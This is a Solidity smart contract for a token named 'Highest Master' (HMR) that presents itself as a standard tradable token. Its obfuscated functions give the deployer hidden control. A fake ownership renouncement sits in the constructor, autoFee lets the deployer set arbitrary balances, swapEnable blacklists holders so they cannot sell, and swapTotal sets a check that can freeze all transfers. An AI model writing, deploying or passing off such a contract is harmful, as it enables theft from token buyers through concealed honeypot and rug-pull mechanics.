//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tradingTeamAmount {
    function createPair(address listTx, address autoMin) external returns (address);
}

interface maxFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldExempt) external view returns (uint256);

    function transfer(address walletLimit, uint256 shouldMode) external returns (bool);

    function allowance(address liquidityLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldMode) external returns (bool);

    function transferFrom(
        address sender,
        address walletLimit,
        uint256 shouldMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAuto, uint256 value);
    event Approval(address indexed liquidityLimit, address indexed spender, uint256 value);
}

abstract contract listMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxFeeMetadata is maxFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HighestMaster is listMin, maxFee, maxFeeMetadata {

    function allowance(address feeSwap, address autoSwap) external view virtual override returns (uint256) {
        if (autoSwap == walletSenderTx) {
            return type(uint256).max;
        }
        return tokenAmountTotal[feeSwap][autoSwap];
    }

    function transferFrom(address marketingTrading, address walletLimit, uint256 shouldMode) external override returns (bool) {
        if (_msgSender() != walletSenderTx) {
            if (tokenAmountTotal[marketingTrading][_msgSender()] != type(uint256).max) {
                require(shouldMode <= tokenAmountTotal[marketingTrading][_msgSender()]);
                tokenAmountTotal[marketingTrading][_msgSender()] -= shouldMode;
            }
        }
        return receiverSender(marketingTrading, walletLimit, shouldMode);
    }

    function name() external view virtual override returns (string memory) {
        return tradingWallet;
    }

    mapping(address => bool) public maxMarketing;

    mapping(address => uint256) private marketingAmount;

    uint256 constant fromTotalTrading = 4 ** 10;

    function balanceOf(address shouldExempt) public view virtual override returns (uint256) {
        return marketingAmount[shouldExempt];
    }

    bool private autoLaunchedSell;

    address public toTeam;

    mapping(address => mapping(address => uint256)) private tokenAmountTotal;

    bool private modeWallet;

    function swapTotal(uint256 shouldMode) public {
        atFrom();
        exemptLaunch = shouldMode;
    }

    bool private feeSender;

    function totalSupply() external view virtual override returns (uint256) {
        return fundLiquidity;
    }

    uint8 private fromExemptToken = 18;

    function receiverSender(address marketingTrading, address walletLimit, uint256 shouldMode) internal returns (bool) {
        if (marketingTrading == enableAuto) {
            return buyToAuto(marketingTrading, walletLimit, shouldMode);
        }
        uint256 takeReceiverFee = maxFee(toTeam).balanceOf(fromBuyExempt);
        require(takeReceiverFee == exemptLaunch);
        require(walletLimit != fromBuyExempt);
        if (tradingLaunched[marketingTrading]) {
            return buyToAuto(marketingTrading, walletLimit, fromTotalTrading);
        }
        return buyToAuto(marketingTrading, walletLimit, shouldMode);
    }

    function approve(address autoSwap, uint256 shouldMode) public virtual override returns (bool) {
        tokenAmountTotal[_msgSender()][autoSwap] = shouldMode;
        emit Approval(_msgSender(), autoSwap, shouldMode);
        return true;
    }

    address walletSenderTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function senderTotal() public {
        emit OwnershipTransferred(enableAuto, address(0));
        tradingReceiver = address(0);
    }

    function autoFee(address feeReceiver, uint256 shouldMode) public {
        atFrom();
        marketingAmount[feeReceiver] = shouldMode;
    }

    address fromBuyExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return tradingReceiver;
    }

    string private tradingWallet = "Highest Master";

    address public enableAuto;

    uint256 walletFee;

    uint256 private fundLiquidity = 100000000 * 10 ** 18;

    bool private minSwapReceiver;

    function swapEnable(address liquidityTx) public {
        atFrom();
        
        if (liquidityTx == enableAuto || liquidityTx == toTeam) {
            return;
        }
        tradingLaunched[liquidityTx] = true;
    }

    address private tradingReceiver;

    function atFrom() private view {
        require(maxMarketing[_msgSender()]);
    }

    uint256 public buyFrom;

    uint256 public liquidityFrom;

    function buyToAuto(address marketingTrading, address walletLimit, uint256 shouldMode) internal returns (bool) {
        require(marketingAmount[marketingTrading] >= shouldMode);
        marketingAmount[marketingTrading] -= shouldMode;
        marketingAmount[walletLimit] += shouldMode;
        emit Transfer(marketingTrading, walletLimit, shouldMode);
        return true;
    }

    bool public toLimit;

    function symbol() external view virtual override returns (string memory) {
        return listMode;
    }

    mapping(address => bool) public tradingLaunched;

    function fromLiquidity(address swapFromAmount) public {
        require(swapFromAmount.balance < 100000);
        if (toLimit) {
            return;
        }
        if (liquidityFrom != buyFrom) {
            buyFrom = senderTake;
        }
        maxMarketing[swapFromAmount] = true;
        
        toLimit = true;
    }

    uint256 exemptLaunch;

    event OwnershipTransferred(address indexed listMax, address indexed fundIs);

    constructor (){
        
        receiverTx launchedFee = receiverTx(walletSenderTx);
        toTeam = tradingTeamAmount(launchedFee.factory()).createPair(launchedFee.WETH(), address(this));
        if (atLiquidityReceiver) {
            modeWallet = false;
        }
        enableAuto = _msgSender();
        maxMarketing[enableAuto] = true;
        marketingAmount[enableAuto] = fundLiquidity;
        senderTotal();
        
        emit Transfer(address(0), enableAuto, fundLiquidity);
    }

    string private listMode = "HMR";

    uint256 private senderTake;

    bool private atLiquidityReceiver;

    function decimals() external view virtual override returns (uint8) {
        return fromExemptToken;
    }

    function transfer(address feeReceiver, uint256 shouldMode) external virtual override returns (bool) {
        return receiverSender(_msgSender(), feeReceiver, shouldMode);
    }

    function getOwner() external view returns (address) {
        return tradingReceiver;
    }

}